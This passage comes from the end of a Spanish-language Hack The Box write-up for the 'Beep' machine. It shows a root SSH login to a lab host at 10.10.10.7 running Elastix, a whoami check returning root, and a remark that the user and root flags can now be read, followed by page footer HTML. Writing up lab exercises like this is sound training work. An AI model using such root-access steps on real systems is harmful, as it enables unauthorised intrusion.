+RSA key fingerprint is SHA256:Ip2MswIVDX1AIEPoLiHsMFfdg1pEJ0XXD5nFEjki/hI.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '</span>10.10.10.7<span class="s1">' (RSA) to the list of known hosts.
+root@10.10.10.7'</span>s password: 
+Last login: Tue Jul 16 11:45:47 2019
+
+Welcome to Elastix 
+<span class="nt">----------------------------------------------------</span>
+
+To access your Elastix System, using a separate workstation <span class="o">(</span>PC/MAC/Linux<span class="o">)</span>
+Open the Internet Browser using the following URL:
+http://10.10.10.7
+
+<span class="o">[</span>root@beep ~]# <span class="nb">whoami
+</span>root
+<span class="o">[</span>root@beep ~]#
+</code></pre></div></div>
+
+<p>A este punto ya somo usuarios administradores y podemos visualizar las flags (user.txt y root.txt).</p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#lfi" class="page__taxonomy-item" rel="tag">LFI</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#easy" class="page__taxonomy-item" rel="tag">Easy</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#linux" class="page__taxonomy-item" rel="tag">Linux</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Fecha:</strong> <time datetime="2021-09-07T00:00:00-05:00">September 07, 2021</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/htb-love/" class="pagination--pager" title="Hack The Box Love
+">Previous</a>
+    
+    
+      <a href="/tratamiento-tty/" class="pagination--pager" title="Tratamiento de la TTY
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2021 K4miyo</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
